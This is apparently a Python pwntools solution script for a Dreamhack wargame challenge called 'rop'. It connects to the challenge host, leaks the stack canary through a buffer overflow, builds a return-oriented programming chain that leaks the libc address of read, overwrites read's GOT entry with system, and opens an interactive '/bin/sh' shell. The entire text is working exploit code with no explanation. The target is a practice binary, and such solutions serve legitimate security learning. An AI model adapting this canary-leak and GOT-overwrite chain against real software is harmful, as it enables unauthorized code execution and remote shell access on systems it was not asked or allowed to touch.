from pwn import *

#p = process('./rop')
p = remote('host3.dreamhack.games', 22753)
e = ELF('./rop')
libc = ELF('./libc-2.27.so')


p.recvuntil(b'Buf: ')

cnry_leak_payload = b'A' * 0x30 # buf len
cnry_leak_payload += b'A' * 0x8 # dummy
cnry_leak_payload += b'A' # null

p.send(cnry_leak_payload)

p.recvuntil(cnry_leak_payload)

cnry = u64(b'\x00' + p.recv(7))

print(f"canary: {cnry}")
print(f"canary: {p64(cnry)}")

read_system = libc.symbols['read'] - libc.symbols['system']

pop_rdi = 0x4007f3
pop_rsi_r15 = 0x4007f1
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']

system_got = read_got - read_system
print(hex(read_plt))
print(hex(read_got))
print(hex(puts_plt))

read_payload = b'A' * 0x30 # buf_len
read_payload += b'A' * 0x8 # dummy
read_payload += p64(cnry) # canary
read_payload += b'B' * 0x8 # dummy

read_payload += p64(pop_rdi) # pop rdi; ret gadget
read_payload += p64(read_got) # puts argument (pop to rdi)
read_payload += p64(puts_plt) # move to eip by ret

##### read got => system got ##### by read(0, read_got(pointer to read_addr), 0x10)
read_payload += p64(pop_rdi)
read_payload += p64(0x00)
read_payload += p64(pop_rsi_r15)
read_payload += p64(read_got)
read_payload += p64(0x00)
read_payload += p64(read_plt)

##### execute read func (read plt) but actually system("/bin/sh")#####
read_payload += p64(pop_rdi)
read_payload += p64(read_got + 0x08)
read_payload += p64(read_plt)



p.sendafter(b'Buf: ', read_payload)

read_addr = u64(p.recv(6) + b'\x00'*2)
system_addr = read_addr - read_system

print(f"read_addr: {hex(read_addr)}")
print(F"system_addr: {hex(system_addr)}")

p.send(p64(system_addr) + b"/bin/sh\x00")
p.interactive()
